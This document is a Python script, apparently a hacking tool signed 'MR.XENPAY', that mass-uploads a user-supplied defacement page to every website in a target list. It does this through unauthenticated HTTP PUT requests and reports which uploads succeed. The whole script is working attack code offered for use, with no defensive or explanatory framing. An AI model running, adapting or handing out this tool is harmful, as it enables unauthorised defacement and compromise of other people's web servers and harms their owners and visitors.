#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests and try again ...")

banner = """
888                        888                             d8b 888                       
888                        888                             Y8P 888                       
888                        888                                 888                       
88888b.   8888b.   .d8888b 888  888 88888b.d88b.   8888b.  888 888     888  888 .d8888b  
888 "88b     "88b d88P"    888 .88P 888 "888 "88b     "88b 888 888     888  888 88K      
888  888 .d888888 888      888888K  888  888  888 .d888888 888 888     888  888 "Y8888b. 
888  888 888  888 Y88b.    888 "88b 888  888  888 888  888 888 888 d8b Y88b 888      X88 
888  888 "Y888888  "Y8888P 888  888 888  888  888 "Y888888 888 888 Y8P  "Y88888  88888P' 
                                                                                         
                                                                                         
                                                                                         
Author : MR.XENPAY
Date   : 2018-12-01
 
 
 
 
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   while True:
      op = open(script,"r").read()
      with open(target_file, "r") as target:
         target = target.readlines()
         s = requests.Session()
         print("uploading file to %d website"%(len(target)))
         for web in target:
            try:
               site = web.strip()
               if site.startswith("http://") is False:
                  site = "http://" + site
               req = s.put(site+"/"+script,data=op)
               if req.status_code < 200 or req.status_code >= 250:
                  print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
               else:
                  print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))

            except requests.exceptions.RequestException:
               continue
            except KeyboardInterrupt:
               print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("Enter your script deface name: ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
